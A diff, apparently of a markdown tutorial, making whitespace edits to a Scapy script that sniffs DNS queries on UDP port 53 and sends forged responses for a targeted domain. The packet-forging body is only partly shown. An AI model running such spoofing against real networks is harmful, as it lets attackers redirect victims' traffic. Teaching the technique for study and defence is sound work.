@@ -59,7 +59,7 @@ A forged DNS response mimics a real one by matching key fields:
 ## 🧾 Simplified Pseudocode
 
 Observe DNS query
-
+    
 If domain matches target:
     Extract domain name
     Create fake IP header
@@ -73,14 +73,13 @@ If domain matches target:
 
 ## Code
 
-
 from scapy.all import *
 
 def spoof_dns(pkt):
     # Step 1: Check if packet contains DNS query
     if DNS in pkt and pkt[DNS].qd is not None:
         qname = pkt[DNS].qd.qname.decode()
-
+        
         # Step 2: Target specific domain
         if "www.example.com" in qname:
             print("[*] Spoofing:", qname)
@@ -146,12 +145,12 @@ def spoof_dns(pkt):
             send(spoofpkt, verbose=0)
 
 
- Step 10: Sniff DNS traffic
- sniff(
+Step 10: Sniff DNS traffic
+sniff(
     filter="udp port 53",
     prn=spoof_dns,
     store=0
- )
+)
 
 ---
 
